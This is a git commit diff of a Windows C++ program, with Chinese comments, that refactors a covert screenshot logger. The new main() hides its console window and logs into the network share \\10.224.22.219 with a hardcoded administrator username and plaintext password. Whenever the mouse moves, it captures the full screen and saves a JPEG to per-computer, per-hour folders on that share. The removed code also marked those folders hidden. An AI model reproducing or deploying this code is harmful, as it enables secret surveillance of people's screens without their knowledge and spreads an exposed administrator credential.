a5e69405f055a04e47b5c1489489a83413b47ad8
strike8k <edcrfvlily5@gmail.com>
2019-09-28 16:45:48 +0800

    減少多餘程式碼
    新增GetTime()抓取時間及創建資料夾
    透過呼叫GetTime()回傳存檔名稱變數totalename
    將totalename值丟給ScreenShot的s

--- ConsoleApplication2/ConsoleApplication2/ConsoleApplication2.cpp
+++ ConsoleApplication2/ConsoleApplication2/ConsoleApplication2.cpp
@@ -1,139 +1,72 @@
-﻿#include <stdio.h>
-#include <stdlib.h>
+﻿#define _CRT_SECURE_NO_WARNINGS
+#include <iostream>
 #include <atlimage.h>
 #include <time.h>
-#include <WinUser.h>
-#include <iostream>
-#include <direct.h>
-#include <Windows.h>
 #include <winbase.h>
-#include <tchar.h>
+#include <direct.h>
+#include <conio.h>
 using namespace std;
-int mouse2;//滑鼠數值容器
-static CString Path = L"\\\\10.224.22.219\\Screen\\"; //檔案路徑變數
+int mouse2 = 0;
 static TCHAR szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
 static DWORD dwSize = MAX_COMPUTERNAME_LENGTH + 1;
-
-//隱藏console
-void HideConsole()
-{
-	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-}
-
-//創建時間資料夾拍攝桌面存入
-void scrshot() {
-	GetComputerName(szBuffer, &dwSize); //Get the computer name
-	CString PCName = szBuffer;//PC名稱變數
-	CImage image;//加入圖像模塊
-	time_t t = time(0);   // 取得現在時間
+CString GetTime() {
+	GetComputerName(szBuffer, &dwSize);
+	CString PCName = szBuffer;
+	time_t t = time(0);
 	struct tm* now = localtime(&t);
 	char timefolder[80];
-	strftime(timefolder, 80, "%m_%d_%H", now);//資料夾時間
-	char buffer[80];
-	strftime(buffer, 80, "%Y-%m-%d %H_%M_%S", now);//時間格式
-	CString type = ".jpg";//檔案類型變
-	CString Filename = buffer;//檔案名稱變數
-	CString Totlename = Path + PCName + "\\" + timefolder + "\\" + Filename + type;//檔案名稱加上路徑
-	CString TotlenameTime = Path + PCName + "\\" + timefolder;//加上時間變數資料夾
-	CW2A pszConvertedAnsichar(TotlenameTime);//型別轉換
-	//確定時間資料夾是否存在自動創建
-	if (_mkdir(pszConvertedAnsichar) == 0)
-	{
-		printf("Directory '\\\\10.224.22.219\\Screen\\PCName\\timefolder' was successfully created\n");
-	}
-	else {
-		printf("Problem creating directory '\\\\10.224.22.219\\Screen\\PCName\\timefolder'\n");
-	}
-	// 獲取窗口設備上下文（Device Contexts）
-	HDC GetDC(NULL); // 要截圖的窗口控制代碼，空值為全螢幕
+	char timename[80];
+	strftime(timename, 80, "%Y-%m-%d %H_%M_%S", now);
+	strftime(timefolder, 80, "%m_%d_%H", now);
+	CString PathPCName = L"\\\\10.224.22.219\\Screen\\" + PCName;
+	CString Foldername = L"\\\\10.224.22.219\\Screen\\" + PCName + "\\" + timefolder;
+	CString totalename = L"\\\\10.224.22.219\\Screen\\" + PCName + "\\" + timefolder + "\\" + timename + ".jpg";
+	CW2A CFoldername(Foldername);
+	CW2A CPathPCName(PathPCName);
+	if (_mkdir(CPathPCName) == 0);
+	if (_mkdir(CFoldername) == 0);
+	return totalename;
+}
+void ScreenShot(LPCTSTR s)
+{
+	POINT pt;
+	BOOL bReturn = GetCursorPos(&pt);
 	HWND hwnd = GetDesktopWindow();
 	HDC hdc = GetWindowDC(hwnd);
 	HDC hdcMem = CreateCompatibleDC(hdc);
+	CImage image;
+	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+	int heigth = GetSystemMetrics(SM_CYVIRTUALSCREEN);
 	HBITMAP hbitmap(NULL);
-	int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);//虛擬畫面寬度
-	int heigth = GetSystemMetrics(SM_CYVIRTUALSCREEN);//虛擬畫面高度
-
 	hbitmap = CreateCompatibleBitmap(hdc, width, heigth);
 	SelectObject(hdcMem, hbitmap);
 	BitBlt(hdcMem, 0, 0, width, heigth, hdc, 0, 0, SRCCOPY);
-
-	// 獲取螢幕相關訊息的尺寸大小
 	int nBitPerPixel = GetDeviceCaps(hdcMem, BITSPIXEL);
-	// 創建圖像，設置高度，像素
 	image.Create(width, heigth, nBitPerPixel);
-
-	//讀取滑鼠圖繪製到hdcMem上
 	HICON hIcon;
-	hIcon = (HICON)LoadImage( // returns a HANDLE so we have to cast to HICON
-		NULL,             // hInstance must be NULL when loading from a file
-		L"C:\\screenshotc++\\cursor.ico",   // the icon file name
-		IMAGE_ICON,       // specifies that the file is an icon
-		0,                // width of the image (we'll specify default later on)
-		0,                // height of the image
-		LR_LOADFROMFILE |  // we want to load a file (as opposed to a resource)
-		LR_DEFAULTSIZE |   // default metrics based on the type (IMAGE_ICON, 32x32)
-		LR_SHARED         // let the system release the handle when it's no longer used
-	);
-	POINT pt;//滑鼠座標指令
-	BOOL bReturn = GetCursorPos(&pt);//滑鼠座標回傳確認變數
+	hIcon = (HICON)LoadImage(NULL, L"C:\\screenshotc++\\cursor.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE | LR_DEFAULTSIZE | LR_SHARED);
 	DrawIcon(hdcMem, pt.x, pt.y, hIcon);
-
-	////// 對指定的源設備環境區域中的像素進行位塊（bit_block）轉換
-	BitBlt(
-		image.GetDC(),  // 保存到的目標 圖片對象 上下文
-		0, 0,     // 起始 x, y 座標
-		width, heigth,  // 截圖寬高
-		hdcMem,      // 擷取對象的 控制代碼
-		0, 0,           // 指定源矩形區域左上角的 X, y 邏輯坐標
-		SRCCOPY);
-
-	// 釋放 DC控制代碼
+	BitBlt(image.GetDC(), 0, 0, width, heigth, hdcMem, 0, 0, SRCCOPY);
 	ReleaseDC(NULL, hdcMem);
-	// 釋放圖片
 	image.ReleaseDC();
-	//image.Save(L"c:\\ScreenShot.jpg", Gdiplus::ImageFormatJPEG);//圖片路徑,圖片格式
-	image.Save(Totlename, Gdiplus::ImageFormatJPEG);//圖片路徑,圖片格式
-	printf("\nSAVE Location ");
-	printf("X: %lu ", pt.x);
-	printf("Y: %lu ", pt.y);
+	image.Save(s, Gdiplus::ImageFormatJPEG);
 }
-
-//X偵測滑鼠移動
 int Xmouseposition() {
-	POINT pt;//滑鼠座標指令
-	BOOL bReturn = GetCursorPos(&pt);//滑鼠座標回傳確認變數
+	POINT pt;
+	BOOL bReturn = GetCursorPos(&pt);
 	int x = pt.x;
 	return x;
 }
-
-//Y偵測滑鼠移動
 int Ymouseposition() {
-	POINT pt;//滑鼠座標指令
-	BOOL bReturn = GetCursorPos(&pt);//滑鼠座標回傳確認變數
+	POINT pt;
+	BOOL bReturn = GetCursorPos(&pt);
 	int y = pt.y;
 	return y;
 }
-
-//主程式
 int main()
 {
-	//HideConsole();隱藏
-	system("NET USE \\\\10.224.22.219 /user:fileserver19\\administrator !qaz2wsx");//登入NAS取的存取權限
-	GetComputerName(szBuffer, &dwSize); //Get the computer name
-	CString PCName = szBuffer;//PC名稱變數
-	CString Totlename = Path + PCName;//電腦名稱資料夾位置
-	CW2A pszConvertedAnsichar(Totlename);//型別轉換CString to char
-	//判斷電腦名稱資料夾是否存在不存在自動創建
-	if (_mkdir(pszConvertedAnsichar) == 0)
-	{
-		printf("Directory '\\\\10.224.22.219\\Screen\\' was successfully created\n");
-		SetFileAttributes(Totlename, FILE_ATTRIBUTE_HIDDEN);
-	}
-	else {
-		printf("Problem creating directory '\\\\10.224.22.219\\Screen\\'\n");
-		SetFileAttributes(Totlename, FILE_ATTRIBUTE_HIDDEN);
-	}
-	//判斷使用者是否動作呼叫scrshot函數
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	system("NET USE \\\\10.224.22.219 /user:fileserver19\\administrator !qaz2wsx");
 	while (true)
 	{
 		int Xmouse1 = Xmouseposition();
@@ -141,13 +74,12 @@ int main()
 		int mouse1 = Xmouse1 + Ymouse1;
 		if (mouse1 == mouse2)
 		{
-			printf("\nSTOP at:");
-			printf("%d", mouse1);
 			Sleep(1000);
 		}
 		else
 		{
-			scrshot();
+			CString totalename = GetTime();
+			ScreenShot((LPCTSTR)(CString)totalename);
 			mouse2 = mouse1;
 			Sleep(2000);
 		}
